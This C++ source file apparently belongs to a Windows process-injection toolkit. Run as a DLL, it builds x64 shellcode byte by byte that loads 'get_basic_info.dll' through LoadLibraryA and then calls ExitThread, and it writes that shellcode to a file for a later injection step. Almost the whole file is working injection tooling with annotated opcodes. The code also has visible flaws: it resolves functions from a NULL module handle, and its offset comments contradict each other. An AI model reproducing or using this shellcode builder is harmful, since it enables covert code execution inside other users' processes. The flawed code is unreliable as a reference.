// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /TP step3.cpp /link /DLL /out:step3.dll /SUBSYSTEM:CONSOLE /MACHINE:x64

#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "splitproc.h"

#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

typedef unsigned __int64 QWORD;
HANDLE log_file = NULL;
DWORD bytesWritten = 0;
DWORD bytesRead = 0;
BOOL verbose_output = TRUE;
DWORD target_proc_pid = 0;
char msg[1024];

void log_msg(const char * line)
{
	if(verbose_output) WriteFile(log_file,line,strlen(line),&bytesWritten, NULL);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(verbose_output)
	{
		log_file = CreateFileA("split.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}
	// OK, here we are only generating the shellcode that will be used in the next step
	
	// 1. Looking up LoadLibraryA() and ExitThread() addresses:
	HMODULE hKernel32 = NULL;
	LPVOID load_library_pointer = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
	if (!load_library_pointer) {
		log_msg("Could not obtain the address of LoadLibraryA()\n");
		FreeLibrary(hKernel32);
		return FALSE;
	}
	memset(msg,0,sizeof(msg));
	snprintf(msg,sizeof(msg),"The current address of LoadLibraryA(): %p\n",load_library_pointer);
	log_msg(msg);
	
	LPVOID exit_thread_pointer = (LPVOID)GetProcAddress(hKernel32, "ExitThread");
	if (!exit_thread_pointer) {
		log_msg("Failed to get the address of ExitThread\n"); // this is not critical, so we do not abort, but it WILL crash the target process
	}
	memset(msg,0,sizeof(msg));
	snprintf(msg,sizeof(msg),"Address of ExitThread() function: %p\n",exit_thread_pointer);
	log_msg(msg);	
	
	// done fetching addresses
	FreeLibrary(hKernel32);
	
	
	// 2. obtaining the DLL file name - we can make this dynamic (and fetch it from the client and save it in a file to then read it back, that would be nice), for now let's go with a static value
	const char dll_to_load_path[]="get_basic_info.dll";
	
	// 3. Building the shellcode_arguments data block that precedes the actual shellcode but goes into the same memory section, as per the new section structure:
/*
The new structure of the newly allocated memory section: 

8-bit addr of LoadLibraryA
PATH TO LOADLIBRARY (STRING, NULL PADDED)
\0\0\0\0
SHELLCODE (AT OFFSET+1024), THIS IS THE ENTRY POINT

LEA RAX,[RIP+0] ; RIP is the beginning of the section + 512
SUB 519,RAX ; now RAX points at the beginning of the section (512 is the offset, 7 is the length of the first instruction)
MOV RAX,RCX ; we copy it to RCX
ADD 8,RCX ; we add 8, so now RCX points at the beginning of the string
MOV *RAX,RAX ; we set RAX to the address of LoadLibraryA
SUB RSP,0x28 ; stack pre-alignment
CALL *RAX ; call LoadLibraryA()
ADD RSP,0x28 ; stack post-alignment

Now, I suggest leaving the ExitThread shellcode as it is. This above is a new version of the LoadLibraryA shellcode, and its main purpose is to make this shellcode shorter and simpler by:
1. Avoiding to have to push the string to the stack, as it is cumbersome because it requires padding it with 0s (and rounding it up to multiplies of 4), then using MOV RAX as an intermediary, it is just less convenient. Instead we copy the string into the same memory section where shellcode goes, just above it, so it is always treated as data and is never executed.
2. Allows us to store the dynamically fetched pointer value in the beginning of the buffer, instead of writing it into it by starting at index 2. It is just more neat.

This will allow us to dynamically change the path of the LoadLibraryA argument without changing the shellcode.
*/
	BYTE shellcode_arguments[512];
	memset(&shellcode_arguments,0,512); 
	// now, let's write the LoadLibraryA() pointer into the beginning of this buffer
	QWORD ptrAsUint = (QWORD)load_library_pointer;
	char * ptr = (char*)&ptrAsUint;
	memcpy(shellcode_arguments,ptr,sizeof(QWORD));	// address of LoadLibraryA() comes at the top of the shellcode_arguments buffer
	memcpy(shellcode_arguments+sizeof(QWORD),dll_to_load_path,strlen(dll_to_load_path)); // the string pointing at the path of the DLL to load comes right afterwards
		
	// we leave 512-(8+strlen(dll_path)) nullbytes here, the offset from the shellcode is fixed (512)
	
	// 4. Building the she loadlibrary_shellcode			
	BYTE load_library_shellcode[] = { 
		0x48,0x8d,0x05,0x00,0x00,0x00,0x00,		// lea    0x0(%rip),%rax        # 0x7, now we have RIP+7 in RAX. At the time of execution RIP will be +512 from the beginning of the section
		// which means we need to subtract 519 from it to point to the beginning of it
		// by the way, what about EBP, won't EBP have this value when the thread starts?
		0x48,0x2d,0x07,0x02,0x00,0x00, //		sub $0x207,%rax 				# now RAX is pointing at the beginning of the section, where the address of LoadLibraryA is stored
		0x48,0x89,0xc1,				   //		mov %rax,%rcx					# now RCX is also pointing there
		0x48,0x83,0xc1,0x08,		   //		add $0x8,%rcx					# now RCX is pointing at the beginning of the string with the DLL path (argument to LoadLibraryA())
		0x48,0x83,0xEC,0x28,		   // sub $0x28,%rsp						# stack pre-alignment before calling LoadLibraryA()
		0x48,0x8b,0x00,				   // mov 0x0(%rax),%rax 					# put the pointer from the memory location rax is pointing at (address of LoadLibraryA()) to RAX
		0xff,0xd0, 					   // call *%rax ~> ffd0					# CALL RAX (CALL LoadLibraryA(PATH_TO_DLL);		
		0x48,0x83,0xC4,0x28,		   // add $0x28,%rsp						# stack post-alignment after calling LoadLibraryA()
	}; 
	// 5. Building the loadlibrary_shellcode
	BYTE exit_thread_shellcode[] = {
		0x48,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // movabs $0x0,%rax (placeholder for ExitThread)
		0x48,0xb9,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // movabs $0x0,%rcx
		0xff,0xd0, // call *%rax		
	};
	// now, let's write the ExitThread() pointer into the shellcode (mov $ADDR,%eax instruction)
	ptrAsUint = (QWORD)exit_thread_pointer;
	ptr = (char*)&ptrAsUint;		
	exit_thread_shellcode[2]=ptr[0]; // we fill 00s (which are just placeholders) with the actual bytes of the address
	exit_thread_shellcode[3]=ptr[1];
	exit_thread_shellcode[4]=ptr[2];
	exit_thread_shellcode[5]=ptr[3];
	exit_thread_shellcode[6]=ptr[4];
	exit_thread_shellcode[7]=ptr[5];
	exit_thread_shellcode[8]=ptr[6];
	exit_thread_shellcode[9]=ptr[7];

	// 6. Finally, building the shellcode from the three pieces: shellcode_arguments[512] + load_library_shellcode + exit_thread
	BYTE final_shellcode[BUFFER_SIZE];
	memset(final_shellcode,0,BUFFER_SIZE);
		// for debugging purposes, we might want to write this buffer out
	memset(msg,0,sizeof(msg));
		
	// concatenate loadlibrary_shellcode and exit_thread
	memcpy(final_shellcode,shellcode_arguments,sizeof(shellcode_arguments));
	memcpy(final_shellcode+sizeof(shellcode_arguments),load_library_shellcode,sizeof(load_library_shellcode));
	memcpy(final_shellcode+sizeof(shellcode_arguments)+sizeof(load_library_shellcode),exit_thread_shellcode,sizeof(exit_thread_shellcode));
	
	SIZE_T size_of_the_buffer = sizeof(shellcode_arguments)+sizeof(load_library_shellcode)+sizeof(exit_thread_shellcode);

	// 7. Write the file
	HANDLE shellcode_file = CreateFileA("split.opcode", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(shellcode_file,final_shellcode,size_of_the_buffer,&bytesWritten, NULL);
	CloseHandle(shellcode_file);
	
	// 8. Log and cleanup
	if(bytesWritten==size_of_the_buffer) log_msg("Opcode written to file split.opcode.\n"); else log_msg("Error writing the opcode to file.\n");
	if(verbose_output) CloseHandle(log_file);
    return TRUE;
}